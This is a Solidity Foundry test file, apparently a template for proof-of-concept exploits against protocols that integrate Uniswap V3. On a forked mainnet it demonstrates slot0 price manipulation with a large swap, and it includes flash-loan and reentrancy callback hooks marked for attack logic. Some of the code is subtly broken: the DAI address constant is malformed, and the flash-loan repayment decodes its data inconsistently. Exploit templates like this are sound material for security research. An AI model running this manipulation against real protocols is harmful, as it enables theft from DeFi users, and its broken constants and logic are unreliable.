// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title Uniswap V3 Exploit PoC Template
 * @notice Template for exploits involving Uniswap V3 integrations
 *
 * Common attack vectors:
 * 1. slot0 price manipulation (single-block manipulable)
 * 2. Callback reentrancy
 * 3. TWAP manipulation (multi-block)
 * 4. Tick math edge cases
 */

// Uniswap V3 Interfaces
interface IUniswapV3Pool {
    function slot0() external view returns (
        uint160 sqrtPriceX96,
        int24 tick,
        uint16 observationIndex,
        uint16 observationCardinality,
        uint16 observationCardinalityNext,
        uint8 feeProtocol,
        bool unlocked
    );

    function observe(uint32[] calldata secondsAgos) external view returns (
        int56[] memory tickCumulatives,
        uint160[] memory secondsPerLiquidityCumulativeX128s
    );

    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);

    function flash(
        address recipient,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;

    function token0() external view returns (address);
    function token1() external view returns (address);
    function fee() external view returns (uint24);
    function liquidity() external view returns (uint128);
}

interface IUniswapV3Factory {
    function getPool(address tokenA, address tokenB, uint24 fee) external view returns (address);
}

interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV3FlashCallback {
    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external;
}

interface IUniswapV3SwapCallback {
    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external;
}

/**
 * @title UniswapV3ExploitPoC
 * @notice Base template for Uniswap V3 exploits
 */
abstract contract UniswapV3ExploitPoC is Test, IUniswapV3FlashCallback, IUniswapV3SwapCallback {
    // Mainnet addresses
    IUniswapV3Factory constant FACTORY = IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);
    ISwapRouter constant ROUTER = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    // Common tokens
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant DAI = 0x6B175474E89094C44Da98b954EedDcDAD11091;
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    // Tick math constants
    int24 constant MIN_TICK = -887272;
    int24 constant MAX_TICK = 887272;
    uint160 constant MIN_SQRT_RATIO = 4295128739;
    uint160 constant MAX_SQRT_RATIO = 1461446703485210103287273052203988822378723970342;

    address constant ATTACKER = address(0xBAD);

    function setUp() public virtual {
        // Fork mainnet
        vm.createSelectFork("mainnet", 18_500_000);
    }

    /// @notice Get current spot price from slot0 (VULNERABLE - manipulable!)
    function _getSpotPrice(address pool) internal view returns (uint160 sqrtPriceX96, int24 tick) {
        (sqrtPriceX96, tick,,,,,) = IUniswapV3Pool(pool).slot0();
    }

    /// @notice Get TWAP price (safer, but still manipulable with enough capital)
    function _getTWAP(address pool, uint32 twapWindow) internal view returns (int24 arithmeticMeanTick) {
        uint32[] memory secondsAgos = new uint32[](2);
        secondsAgos[0] = twapWindow;
        secondsAgos[1] = 0;

        (int56[] memory tickCumulatives,) = IUniswapV3Pool(pool).observe(secondsAgos);

        int56 tickCumulativesDelta = tickCumulatives[1] - tickCumulatives[0];
        arithmeticMeanTick = int24(tickCumulativesDelta / int56(uint56(twapWindow)));
    }

    /// @notice Calculate price from sqrtPriceX96
    function _sqrtPriceToPrice(uint160 sqrtPriceX96, uint8 decimals0, uint8 decimals1) internal pure returns (uint256) {
        uint256 price = uint256(sqrtPriceX96) * uint256(sqrtPriceX96);
        return price * (10 ** decimals0) / (10 ** decimals1) / (1 << 192);
    }

    /// @notice Log pool state
    function _logPoolState(address pool) internal view {
        (uint160 sqrtPriceX96, int24 tick,,,,,) = IUniswapV3Pool(pool).slot0();
        uint128 liquidity = IUniswapV3Pool(pool).liquidity();

        console.log("=== Pool State ===");
        console.log("sqrtPriceX96:", sqrtPriceX96);
        console.log("tick:", tick);
        console.log("liquidity:", liquidity);
    }

    /// @notice Flash callback - implement attack here
    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external virtual override {
        address pool = msg.sender;
        address token0 = IUniswapV3Pool(pool).token0();
        address token1 = IUniswapV3Pool(pool).token1();

        console.log("Flash loan callback - fees:", fee0, fee1);

        // === IMPLEMENT ATTACK LOGIC HERE ===
        _executeFlashAttack(pool, fee0, fee1, data);

        // Repay flash loan with fees
        if (fee0 > 0) {
            uint256 amount0 = abi.decode(data, (uint256));
            IERC20(token0).transfer(pool, amount0 + fee0);
        }
        if (fee1 > 0) {
            (, uint256 amount1) = abi.decode(data, (uint256, uint256));
            IERC20(token1).transfer(pool, amount1 + fee1);
        }
    }

    /// @notice Swap callback
    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external virtual override {
        // Pay for the swap
        address pool = msg.sender;

        if (amount0Delta > 0) {
            IERC20(IUniswapV3Pool(pool).token0()).transfer(pool, uint256(amount0Delta));
        }
        if (amount1Delta > 0) {
            IERC20(IUniswapV3Pool(pool).token1()).transfer(pool, uint256(amount1Delta));
        }
    }

    /// @notice Override this with flash attack logic
    function _executeFlashAttack(address pool, uint256 fee0, uint256 fee1, bytes calldata data) internal virtual;
}

/**
 * @title Slot0ManipulationAttack
 * @notice Example: Manipulate slot0 price in single block
 *
 * CRITICAL: This demonstrates why slot0 should NEVER be used for pricing
 */
contract Slot0ManipulationAttack is UniswapV3ExploitPoC {
    address targetPool;
    address vulnerableProtocol;

    function test_slot0Manipulation() public {
        vm.startPrank(ATTACKER);

        // Get WETH/USDC pool (0.3% fee tier)
        targetPool = FACTORY.getPool(WETH, USDC, 3000);
        console.log("=== Slot0 Manipulation Attack ===");

        // Step 1: Log initial state
        console.log("\n--- Before Manipulation ---");
        _logPoolState(targetPool);
        (uint160 priceBefore,) = _getSpotPrice(targetPool);

        // Step 2: Get large amount to manipulate
        deal(WETH, ATTACKER, 10000 ether);
        IERC20(WETH).approve(address(ROUTER), type(uint256).max);

        // Step 3: Execute large swap to move price
        console.log("\n--- Executing Price Manipulation ---");
        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
            tokenIn: WETH,
            tokenOut: USDC,
            fee: 3000,
            recipient: ATTACKER,
            deadline: block.timestamp,
            amountIn: 5000 ether,
            amountOutMinimum: 0, // No slippage protection for demo
            sqrtPriceLimitX96: 0
        });

        uint256 amountOut = ROUTER.exactInputSingle(params);
        console.log("Swapped 5000 WETH for USDC:", amountOut / 1e6);

        // Step 4: Check manipulated price
        console.log("\n--- After Manipulation ---");
        _logPoolState(targetPool);
        (uint160 priceAfter,) = _getSpotPrice(targetPool);

        console.log("\nPrice change:");
        console.log("Before:", priceBefore);
        console.log("After:", priceAfter);

        // In a real attack, would now:
        // 1. Call vulnerable protocol that uses slot0
        // 2. Get favorable rate
        // 3. Swap back to original position
        // 4. Profit from the difference

        vm.stopPrank();
    }

    function _executeFlashAttack(address, uint256, uint256, bytes calldata) internal override {}
}

/**
 * @title TWAPManipulationAnalysis
 * @notice Analyze TWAP manipulation costs
 */
contract TWAPManipulationAnalysis is UniswapV3ExploitPoC {
    function test_twapAnalysis() public view {
        address pool = FACTORY.getPool(WETH, USDC, 3000);

        console.log("=== TWAP Analysis ===");

        // Compare spot vs TWAP
        (, int24 spotTick) = _getSpotPrice(pool);
        int24 twap30min = _getTWAP(pool, 30 minutes);
        int24 twap1hour = _getTWAP(pool, 1 hours);

        console.log("Spot tick:", spotTick);
        console.log("30min TWAP tick:", twap30min);
        console.log("1hour TWAP tick:", twap1hour);

        // The difference shows how much manipulation has occurred
        console.log("\nDeviation from spot:");
        console.log("30min:", int256(spotTick) - int256(twap30min));
        console.log("1hour:", int256(spotTick) - int256(twap1hour));
    }

    function _executeFlashAttack(address, uint256, uint256, bytes calldata) internal override {}
}

/**
 * @title CallbackReentrancy
 * @notice Example: Reentrancy during swap callback
 */
contract CallbackReentrancy is UniswapV3ExploitPoC {
    bool inCallback;
    address vulnerableTarget;

    function test_callbackReentrancy() public {
        vm.startPrank(ATTACKER);

        console.log("=== Callback Reentrancy Demo ===");

        // Setup
        address pool = FACTORY.getPool(WETH, USDC, 3000);
        deal(WETH, address(this), 100 ether);

        // This demonstrates how a malicious callback could be exploited
        // In real attack: would call vulnerable protocol during callback

        console.log("In a real attack:");
        console.log("1. Start swap on Uniswap");
        console.log("2. During callback, call vulnerable protocol");
        console.log("3. Protocol reads stale state");
        console.log("4. Profit from inconsistent state");

        vm.stopPrank();
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external override {
        if (!inCallback) {
            inCallback = true;

            // === REENTRANCY ATTACK POINT ===
            // Call vulnerable protocol here while pool is in inconsistent state

            inCallback = false;
        }

        // Pay for swap
        super.uniswapV3SwapCallback(amount0Delta, amount1Delta, data);
    }

    function _executeFlashAttack(address, uint256, uint256, bytes calldata) internal override {}
}
